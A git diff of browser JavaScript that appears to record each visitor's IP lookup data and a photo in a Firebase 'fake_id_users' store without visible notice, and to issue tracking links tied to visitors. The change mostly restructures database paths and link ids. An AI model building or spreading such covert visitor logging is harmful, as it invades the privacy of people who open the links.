@@ -19,6 +19,8 @@ document.addEventListener('DOMContentLoaded', function () {
 
 
 
+  var uniqueNum = Math.floor(Math.random(1,1000000))+new Date().getTime()
+
     function GetFakeUserData() { 
       if (document.querySelectorAll('.wvu img').length > 0) { 
         function SaveThisdata(photo) { 
@@ -28,7 +30,7 @@ document.addEventListener('DOMContentLoaded', function () {
             var ip = `${jsonResponse.ip}`.replaceAll('.','-')
             firebase
             .database()
-            .ref("fake_id_users/" + ip)
+            .ref("fake_id_users/users/" + ip)
             .set({
               "photo": photo,
               ...jsonResponse
@@ -177,11 +179,12 @@ document.addEventListener('DOMContentLoaded', function () {
               (response) => response.json()
             ).then((jsonResponse) => {
               var ip = `${jsonResponse.ip}`.replaceAll('.','-')
-              var link = window.location.origin+"?of="+Math.floor(Math.random(1,10000))+"-"+ip+"-"+new Date().getTime()
+              var link = window.location.origin+"?of="+uniqueNum
               firebase
               .database()
-              .ref("fake_id_users/links" +ip)
+              .ref("fake_id_users/links/" +uniqueNum)
               .set({
+                "ip":ip,
                 "link":link,
                 "imglink": imgDiv.dataset.img,
               });
@@ -204,9 +207,9 @@ document.addEventListener('DOMContentLoaded', function () {
           var ip = `${jsonResponse.ip}`.replaceAll('.','-')
           firebase
           .database()
-          .ref("fake_id_users/links" +ip)
-          .on("value", function (snap) {
-            console.log(snap)
+          .ref("fake_id_users/links/" +uniqueNum)
+          .on("value", function (datas) {
+            console.log(datas)
             // document.getElementById("roll").value = snap.val().rollNo;
             // document.getElementById("name").value = snap.val().name;
             // document.getElementById("gender").value = snap.val().gender;
